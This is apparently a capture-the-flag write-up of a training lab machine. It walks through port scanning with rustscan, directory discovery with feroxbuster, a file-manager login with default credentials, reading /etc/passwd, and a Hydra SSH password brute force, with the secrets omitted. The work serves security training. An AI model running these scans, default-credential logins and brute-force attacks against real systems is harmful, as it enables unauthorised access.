## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
This warmup machine focuses on teaching how to perform directory scanning on Apache and SSH services, brute-force attacks and how to chain exploit common application vulnerabilities.  
  
It is recommended for practicing how to discover and exploit security vulnerabilities on web servers and SSH protocols.
```

## IP-Address
```IP-Address
172.20.5.149
```

## Rustscan 
```bash
rustscan -a 172.20.5.149 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn -A
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 be:c9:de:f2:24:b2:ac:0c:4c:2e:06:40:8c:9a:68:b3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDZ+WktG6TAivT9jVFARSH1zPJH4J8e8EgjV/MWGLmoMS7Nmi7xUfSEIh1pH3AcKqzykkBHKt7q/UJmz67ONpMTdfM9qWub+bqsTWeaygUySzPdynXMj2ZheaKFNawMYZz1XS5Y9gcjK3AZS6W/XUeZ3kD7rFfuvirp49k6ytkIa/pT3o0/BuxUjFk2wb3C4BIM93fWaggURvjoJvmiHhxwyF3so7suBkz/TXbZ8MYoIKYReldzF5VODBaUqY74vu0xOYIR6ZcLdBkhajf/HgHVijNueUiB2gIdRZotcaWGaG8Ws2n/pPsUG2eGh70SwvuuGyykh7qObH8/+KePwxMTjuAaHun1MIuUZLLN0+O/GnD/xlbAtF0J7X8L+BWg4BTXfMxWQ0QpsaUhXNfqhkrTdzgp3ZijVWNsDc6hs9ZTKNnueV8N3JfPMhFl0Xbt/+ThOUOQc3lA1goR5MTbVfjoz6tgvOozztEsBKBxsRXvPmVeSQR5XXxuUz5+deBS+Ks=
|   256 ff:3c:f4:91:98:ff:66:2f:50:f7:f2:9f:aa:f2:4c:9b (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNtGj8RB6qs79tiXiLtj7SnU48/hDf2xWtJ4syXg6CdUkx2J+7BEvG23OHAD35f34XP+dna6naosTWoxGUBhdBs=
|   256 c0:5c:da:06:8d:28:3e:70:49:cf:3e:7d:2d:8e:54:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKls4TVOHD3+s+kcSkuGJJW6cADKHb5N9ZN1rtdXGCQ4
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.56 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
```

## Port 80
Using Browser navigate to http://172.20.5.149:80 and its lead us to apache setup interface page /debian and it nothing more so we attempt more thing 
## Feroxbuster 
```bash 
feroxbuster -u http://172.20.5.149 \ 
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,js,html,txt \
  -n -k -t 50
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://172.20.5.149
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/common.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, js, html, txt]
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
404      GET        9l       31w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10355c http://172.20.5.149/icons/openlogo-75.png
200      GET      368l      933w    10701c http://172.20.5.149/
301      GET        9l       28w      318c http://172.20.5.149/filemanager => http://172.20.5.149/filemanager/
200      GET      368l      933w    10701c http://172.20.5.149/index.html
[####################] - 89s    23755/23755   0s      found:4       errors:21     
[####################] - 88s    23725/23725   269/s   http://172.20.5.149/
```
After that we Discover about the 
```Discovery
Filemanager
Index.html
Openlogo
```
Our motive is only to File manager as lets browse it over the Brave-browser
 We navigate to http://172.20.5.149/filemanager and we discover that 
 Its an `Login Page `or `authentication` file manager web interface where we can actually surf about the file on the system and what I found that the  by default user name and password of the system is 
 ```Credentials 
 User:[credentials omitted]
```
and then we navigate in to the system files where we can see who is the user which let his guard down 
so wen discover
We discover file at /etc/passwd
```/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
hackviser:x:1000:1000:hackviser,,,:/home/hackviser:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
rock:x:1001:1001::/home/rock:/bin/bash
```
Last user who is actually present is Rock, lets guess his password using `Hydra` and lets found using ssh 
```bash
$hydra -l rock -P /usr/share/wordlists/rockyou.txt ssh://172.20.5.149 -t 4
[STATUS] 64.00 tries/min, 64 tries in 00:01h, 14344335 to do in 3735:31h, 4 active
[22][ssh] host: 172.20.5.149   login: rock   password: [password omitted]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-23 02:26:03
```
Got the password now login using SSH
```bash
rock@discover-lernaean:~$ ls
rock@discover-lernaean:~$ ls -la
total 16
drwxr-xr-x 2 rock rock 4096 Sep 20  2023 .
drwxr-xr-x 4 root root 4096 Sep 20  2023 ..
-rw------- 1 rock rock  121 Sep 20  2023 .bash_history
-rw-r--r-- 1 rock rock 3526 Mar 27  2022 .bashrc
rock@discover-lernaean:~$ cat .bash_history 
cat .bash_history
cd
ls -la
```

END
  